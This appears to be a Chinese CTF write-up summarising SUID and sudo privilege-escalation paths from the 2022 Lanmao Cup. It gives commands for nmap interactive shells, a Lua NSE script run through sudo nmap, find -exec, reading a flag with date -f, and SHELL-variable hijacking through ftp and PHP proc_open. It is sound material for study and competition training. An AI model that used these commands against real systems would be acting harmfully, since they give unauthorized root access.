---
title: 2022 蓝帽杯 SUID 提权 总结篇
contest: 蓝帽杯 2022
year: 2022
difficulty: medium
vuln_type: [auth_bypass, misc_unknown]
tags: [SUID, find, nmap, nse, lua, ftp, date, find-exec, env-var, SHELL-override]
attack_chain: ["find SUID 文件：find / -user root -perm -4000 2>/dev/null", "nmap --interactive 进入交互模式 !sh 提权", "sudo nmap --script=/tmp/shell.nse 跑 lua 脚本", "find -exec whoami ; 用空格 + 分号执行命令", "date -f /flag 触发错误读文件", "putenv('SHELL=/usr/bin/od') 劫持 SHELL 环境变量", "proc_open ftp + 管道输入 ! /flag 读文件"]
key_payload: "nmap --interactive → !sh / sudo nmap --script=shell.nse"
one_liner: SUID 提权 5 种经典路径：nmap / find-exec / date -f / ftp env / SHELL hijack
lesson: SUID 位运行 root 程序时应避免调用外部命令或保留 SHELL 路径；sudo nmap 加载 lua 脚本是 GTFObins 经典
quality: high
---

# 2022 蓝帽杯 SUID 提权 总结篇

原文 https://www.ctfiot.com/68117.html

## SUID 提权 5 大经典

### 1. nmap 老版本
```bash
find / -user root -perm -4000 2>/dev/null
# 发现 nmap 有 SUID
nmap --interactive
nmap> !sh           # 进入 root shell
# whoami
# root
```

### 2. sudo nmap + lua
```bash
echo "os.execute('/var/www/html/root-see.out')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

### 3. find -exec
```bash
find -exec whoami \;
# 注意空格 + 分号
```

### 4. date -f
```bash
date -f /flag      # 读文件内容作为日期格式，触发错误打印
```

### 5. ftp SHELL 环境变量劫持
```c
// 关键代码
theshell = getenv("SHELL");
...
execl(theshell, shellnam, "-c", arg, NULL);
```
```bash
putenv("SHELL=/usr/bin/od")
# 之后用 ftp 触发的 shell 走 /usr/bin/od，可执行任意二进制
```

PHP proc_open 触发：
```php
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "r")
);
$process = proc_open("ftp", $descriptorspec, $file);
fputs($file[0], "! /flag\n");
```

## SUID 提权核心
- **SUID 位 `chmod u+s`**：执行时 euid = 文件拥有者
- **Sudo 列表**：`sudo -l` 看用户能跑的命令
- **GTFObins**：https://gtfobins.github.io/ 全网最全 SUID/Sudo 提权字典
- **环境变量劫持**：`SHELL`、`PATH`、`LD_PRELOAD`、`IFS` 都是攻击面

## 蓝帽杯场景
- 比赛/护网常有 "拿到 www-data → 提权 root" 链
- 优先看 `find / -perm -u=s -type f 2>/dev/null`
- 其次看 `sudo -l` 输出的 NOPASSWD 命令
- 各种 SUID 工具 → GTFObins 一查就有
